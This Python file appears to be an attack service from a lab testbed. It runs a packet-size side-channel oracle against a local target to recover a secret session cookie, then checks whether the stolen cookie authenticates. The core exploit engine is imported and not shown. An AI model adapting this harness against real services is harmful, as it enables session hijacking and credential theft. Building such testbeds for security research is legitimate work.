import asyncio
import logging
import os
import socket

import aiohttp
from aiohttp import web

from attacker import engine, measure_pcap
from attacker.inject import build_probe

LOG = logging.getLogger("attacker.service")

ENGINE_PORT = int(os.environ.get("ENGINE_PORT", "9000"))
HARNESS_URL = os.environ.get("HARNESS_URL", "http://client:8000")
SETTLE_S = float(os.environ.get("SETTLE_S", "0.15"))
COOKIE_LENGTH = int(os.environ.get("COOKIE_LENGTH", "16"))
MIN_MARGIN = int(os.environ.get("MIN_MARGIN", "8"))
MIN_AGREEMENT = int(os.environ.get("MIN_AGREEMENT", "5"))
MAX_ROUNDS = int(os.environ.get("MAX_ROUNDS", "16"))


def _make_oracle(target_port: int, http: aiohttp.ClientSession):
    async def oracle(prefix: bytes, candidate: bytes, align_len: int) -> int:
        async with http.post(f"{HARNESS_URL}/trigger") as r:
            if r.status != 200:
                raise RuntimeError(f"harness /trigger returned {r.status}")
        measure_pcap.PACKET_LOG.clear()
        probe = build_probe(prefix, candidate, align_len)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, _send_probe, target_port, probe)
        await asyncio.sleep(SETTLE_S)
        records = measure_pcap.PACKET_LOG.snapshot(include_acks=False)
        return measure_pcap.sum_payload(records)
    return oracle


def _send_probe(target_port: int, probe: bytes) -> None:
    with socket.create_connection(("127.0.0.1", target_port), timeout=5.0) as s:
        s.sendall(probe)
        s.shutdown(socket.SHUT_WR)


async def _run_attack_handler(request: web.Request) -> web.Response:
    body = await request.json()
    target_port = int(body["target_port"])
    LOG.info("trial start: target_port=%d", target_port)

    async with aiohttp.ClientSession() as http:
        oracle = _make_oracle(target_port, http)
        try:
            recovered = await engine.run_attack(
                oracle=oracle,
                cookie_length=COOKIE_LENGTH,
                min_margin=MIN_MARGIN,
                min_agreement=MIN_AGREEMENT,
                max_rounds=MAX_ROUNDS,
            )
        except engine.RecoveryFailed as exc:
            LOG.warning("recovery failed: %s", exc)
            return web.json_response({"error": str(exc)}, status=500)

    LOG.info("trial recovered: %s", recovered.hex())
    return web.json_response({"recovered_cookie": recovered.hex()})


async def _e2e_check_handler(request: web.Request) -> web.Response:
    from attacker.verify import authenticate
    body = await request.json()
    target_port = int(body["target_port"])
    cookie_hex = body["cookie_hex"]
    ok = await authenticate(target_port, cookie_hex)
    return web.json_response({"ok": ok})


def _make_app() -> web.Application:
    app = web.Application()
    app.router.add_post("/run_attack", _run_attack_handler)
    app.router.add_post("/e2e_check", _e2e_check_handler)
    return app


def main() -> None:
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(name)s %(levelname)s %(message)s")
    measure_pcap.start()
    try:
        web.run_app(_make_app(), host="0.0.0.0", port=ENGINE_PORT, access_log=None)
    finally:
        measure_pcap.stop()


if __name__ == "__main__":
    main()
